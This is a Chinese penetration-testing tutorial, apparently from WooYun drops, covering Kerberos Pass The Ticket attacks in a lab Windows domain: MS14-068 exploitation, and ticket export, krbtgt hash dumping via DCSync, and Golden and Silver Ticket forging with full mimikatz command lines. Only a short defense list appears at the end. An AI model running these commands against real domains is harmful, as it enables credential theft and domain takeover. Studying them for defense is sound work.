# 域渗透——Pass The Ticket

0x00 前言
=======

* * *

上篇介绍了有关Pass The Hash 和Pass The Key的技巧，这次接着介绍一下Pass The Ticket

![Alt text](http://drops.javaweb.org/uploads/images/45ec7329759e29e0489d223cfdcf742d8c5d3079.jpg)

此图片引用自http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/

0x01 简介
=======

* * *

在域环境中，Kerberos协议被用来作身份认证，上图所示即为一次简单的身份认证流程，具体细节可以参考相关资料，这里仅介绍几个名词：

*   KDC(Key Distribution Center)： 密钥分发中心，里面包含两个服务：AS和TGS
*   AS(Authentication Server)： 身份认证服务
*   TGS(Ticket Granting Server)： 票据授予服务
*   TGT(Ticket Granting Ticket): 由身份认证服务授予的票据，用于身份认证，存储在内存，默认有效期为10小时
*   Pass The Ticket： 如果我们能够拿到用户的TGT，并将其导入到内存，就可以冒充该用户获得其访问权限

在了解了相关名词之后，我们从实际利用的角度来介绍与Pass The Ticket有关的技术

**测试环境：**

```
域控：
os:server 2008 r2 x64
ip：192.168.40.132

域内主机：
os:win7 x64
ip：192.168.40.225

```

0x02 MS14-068
=============

* * *

时至今日，该漏洞已经过去一年多，针对其攻击的防御检测方法已经很成熟，所以对其利用方法做一个回顾。

### 1、PyKEK

最先公开的利用方法是Sylvain Monné用Python实现的PyKEK

准备条件：

*   域用户及其口令
*   域用户对应sid
*   域控地址
*   Win7及以上系统

> **Tips：**
> 
> 1.  操作系统要求Win7及以上，这是因为XP不支持导入Ticket
> 2.  攻击主机可使用其他域用户信息，比如可以在主机A上用域用户B的口令及sid攻击
> 3.  将Python脚本转成exe即可在任意一台Windows主机使用

漏洞利用的步骤为：

*   如果漏洞触发成功，会生成.ccache文件
*   通过klist purge先清除内存中的Ticket
*   使用mimikatz的ptc功能将.ccache导入到内存
*   通过klist查看导入的Ticket
*   使用net use 连接域控

> **Tips：**
> 
> 1.  如果不先清除内存中的Ticket直接导入，有可能会失败
> 2.  连接域控要使用域控地址，不要用IP

### 2、kekeo

Benjamin DELPY用c实现了MS14-068的利用工具，更简单高效。

因为域用户对应sid本就可以通过程序自动获取，清除导入票据也能自动实现，当然，如果想用其他域用户信息攻击，也可以加上sid手动导入票据

kekeo的快捷用法仅需要以下参数：

*   域用户及其口令
*   域控地址

实际测试如图，成功获得了域控的访问权限

![Alt text](http://drops.javaweb.org/uploads/images/73d30fe10c11e7292e7b53e9270e8727aecae0a9.jpg)

![Alt text](http://drops.javaweb.org/uploads/images/4dbcd02e71f79afaaf4a9ae437bc43980e89e83f.jpg)

下载地址：  
[https://github.com/gentilkiwi/kekeo/releases](https://github.com/gentilkiwi/kekeo/releases)

0x03 Export the ticket
======================

* * *

在我们成功获得域控权限后，就可以导出域控内存中的Ticket，在默认的10个小时以内都可以利用来登录域控

通过mimikatz导出内存中的Ticket，执行：

```
sekurlsa::tickets /export

```

如图![Alt text](http://drops.javaweb.org/uploads/images/9ec8787a8c36c9da3bb068b452796f61a00e9f33.jpg)

保存成文件，一共导出如下文件，如图![Alt text](http://drops.javaweb.org/uploads/images/03236dc485a6101550e0c32f2f100d354ae84149.jpg)

挑选其中的`[0;2d87a]-2-0-40e00000-a@krbtgt-TEST.LOCAL.kirbi`在域普通用户的主机进行导入

执行：

```
mimikatz "kerberos::ptt C:\test\[0;2d87a]-2-0-40e00000-a@krbtgt-TEST.LOCAL.kirbi"

```

如图，导入成功![Alt text](http://drops.javaweb.org/uploads/images/d47453ca79bb6e0292a8ff45333983df6cd20d6a.jpg)

查看是否有域控权限，如图![Alt text](http://drops.javaweb.org/uploads/images/8316d8a8409a1f2f5c347dda0317e3aabef030cd.jpg)

> **Tips：**
> 
> 1.  64位系统使用ptt功能要用32位的mimikatz，如果用64的mimikatz，那么无法导入Ticket
> 2.  这种方式导入的Ticket默认在10小时以内生效

0x04 Golden Ticket
==================

* * *

每个用户的Ticket都是由krbtgt的密码Hash来生成的，那么，我们如果拿到了krbtgt的密码Hash，不就可以随意伪造Ticket了吗？

实际上只要拿到了域控权限，在上面就可以很容易的获得krbtgt的Hash值，再通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket

### 1、导出krbtgt的Hash

在域控上执行

```
mimikatz log "lsadump::dcsync /domain:test.local /user:krbtgt"

```

生成mimikatz.log记录输出，使用log输出是为了方便复制Hash值

如图:![Alt text](http://drops.javaweb.org/uploads/images/1104a160a14d532b5b6b02dcbb17ad3677b02451.jpg)

找到如下信息：

```
/domain：test.local
/sid:S-1-5-21-4155807533-921486164-2767329826 
/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f

```

### 2、生成Golden Ticket

伪造的用户设置为god,执行

```
mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 
/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f /user:god 
/ticket:gold.kirbi"

```

生成文件gold.kirbi

> **Tips:**
> 
> 生成Golden Ticket不仅可以使用aes256，也可用krbtgt的NTLM hash  
> 可以用`mimikatz "lsadump::lsa /patch"`导出

如图![Alt text](http://drops.javaweb.org/uploads/images/3fc9582d88691ef4f9e26183ca8bae3ac27d6a96.jpg)

导入Golden Ticket，执行如下命令：

```
kerberos::ptt c:\test\gold.kirbi

```

如图，成功获得域控权限![Alt text](http://drops.javaweb.org/uploads/images/c18e807a566e39f0e3866b8f9cfde25d159f9dbe.jpg)

> **Tips：**
> 
> 1.  这种方式导入的Ticket默认在20分钟以内生效，当然，如果过期了，再次ptt导入Golden Ticket就好
> 2.  可以伪造任意用户，即使其不存在
> 3.  krbtgt的NTLM hash不会轻易改变，即使修改域控管理员密码

0x05 Silver Ticket
==================

* * *

Silver Ticket是伪造的TGS(Ticket Granting Server)ticket，所以也叫service ticket

将它同Golden Ticket做对比：

### 1、访问权限不同

Golden Ticket是伪造的TGT(Ticket Granting Ticket)，所以可以获取任何Kerberos服务权限

Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限

### 2、加密方式不同

Golden Ticket是由krbtgt的hash加密

Silver Ticket是由服务账户（通常为计算机账户）hash加密

### 3、认证流程不同

Golden Ticket在使用的过程需要同域控通信

Silver Ticket在使用的过程不需要同域控通信

**举例说明Silver Ticket：**

正常的认证流程为![Alt text](http://drops.javaweb.org/uploads/images/5b94f4082787998582167601d7134f0a214d0654.jpg)

此图片引用自http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/

如果使用了Silver Ticket，认证流程变为![Alt text](http://drops.javaweb.org/uploads/images/192be0c277d5ce7e7b241c6d51e3307925523cad.jpg)

此图片引用自http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/

不难看出其中取消了步骤`1-4`

也就是说只要手里有Silver Ticket，就可以跳过KDC认证，直接去访问指定的服务。

**比如现在要访问域控上的“cifs”服务**（cifs服务用于Windows主机间的文件共享）

首先需要获得如下信息：

*   /domain
*   /sid
*   /target:目标服务器的域名全称，此处为域控的全称
*   /service：目标服务器上面的kerberos服务，此处为cifs
*   /rc4：计算机账户的NTLM hash，域控主机的计算机账户
*   /user：要伪造的用户名，此处可用silver测试

在域控上执行如下命令来获取域控主机的本地管理员账户hash

```
mimikatz log "sekurlsa::logonpasswords"

```

如图![Alt text](http://drops.javaweb.org/uploads/images/b26363f684cb4d6a073f7b705f7665f7f03a63f7.jpg)

> **注：**
> 
> 此处要找到计算机账户，也就是`Username : WIN-8VVLRPIAJB0$`的`NTLM hash`，如果是其他账户，那么会失败

整理以上获得的信息如下：

*   /domain:test.local
*   /sid:S-1-5-21-4155807533-921486164-2767329826
*   /target:WIN-8VVLRPIAJB0.test.local
*   /service:cifs
*   /rc4:d5304f9ea69523479560ca4ebb5a2155
*   /user:silver

使用mimikatz执行如下命令导入Silver Ticket

```
mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt"

```

如图，成功导入，此时可以成功访问域控上的文件共享

![Alt text](http://drops.javaweb.org/uploads/images/6fe9b6a7baf5795200f80e2a7ed7079f8c890582.jpg)

![Alt text](http://drops.javaweb.org/uploads/images/98fbeb256a4d5428b19df97f055d822e9cf1aaea.jpg)

**为了加深理解，再举一个例子**

**访问域控上的“LDAP”服务**

整理信息如下，只需要把/service的名称改为LDAP,/user改为krbtgt,/rc4改为krbtgt的NTLM HASH

*   /domain:test.local
*   /sid:S-1-5-21-4155807533-921486164-2767329826
*   /target:WIN-8VVLRPIAJB0.test.local
*   /service:LDAP
*   /rc4:d5304f9ea69523479560ca4ebb5a2155
*   /user:krbtgt

mimikatz导入Silver Ticket的命令为：

```
mimikatz "kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:LDAP /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:krbtgt /ptt"

```

此时`dir \\WIN-8VVLRPIAJB0.test.local\c$`发现无法访问，也就是前面提到的

> Silver Ticket是伪造的TGS，也就是说其范围有限，只能访问指定的服务权限

如图，虽然成功导入，但是无法访问域控的文件共享![Alt text](http://drops.javaweb.org/uploads/images/e80f06512794b81ddee2b94a899b96f413943b1d.jpg)

但是执行如下命令可以远程访问LDAP服务来获得krbtgt的信息：

```
mimikatz "lsadump::dcsync /dc:WIN-8VVLRPIAJB0.test.local /domain:test.local /user:krbtgt"

```

如图，成功远程获得krbtgt账户信息![Alt text](http://drops.javaweb.org/uploads/images/ad1191e312de3baedffc0875cadba790968a991d.jpg)

注：

```
lsadump::dcsync
向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。
需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户
只读域控制器默认不允许读取用户密码数据

```

参数选项：

```
/user - 要查询的用户id 或 SID
/domain（可选的）默认设置为当前域。
/dc（可选的）指定DCSync 连接的域控位置

```

当然，还有其他服务可通过伪造Silver Ticket访问：

如图列举了其他可用作Silver Ticket的服务：![Alt text](http://drops.javaweb.org/uploads/images/09da791ddfba9536ccbee0d373bfd02d0b16ea92.jpg)

此图片引用自https://adsecurity.org/?p=2011

0x06 防御
=======

* * *

1.  域控及时更新补丁
2.  时刻监控域控日志
3.  限制mimikatz使用

0x07 小结
=======

* * *

本文介绍了和Pass The Ticket有关的技术，着重对实际使用的一些情况做了演示，无论攻防，只有实践，才会进步。

Real knowledge comes from practices.

0x08 参考资料：
==========

* * *

*   [http://www.roguelynn.com/words/explain-like-im-5-kerberos/](http://www.roguelynn.com/words/explain-like-im-5-kerberos/)
*   [https://www.youtube.com/watch?v=ztY1mqsBedE](https://www.youtube.com/watch?v=ztY1mqsBedE)
*   [https://adsecurity.org/?p=1515](https://adsecurity.org/?p=1515)
*   [https://adsecurity.org/?p=1640](https://adsecurity.org/?p=1640)
*   [https://adsecurity.org/?p=2011](https://adsecurity.org/?p=2011)
*   [http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/](http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/)

**本文由三好学生原创并首发于乌云drops，转载请注明**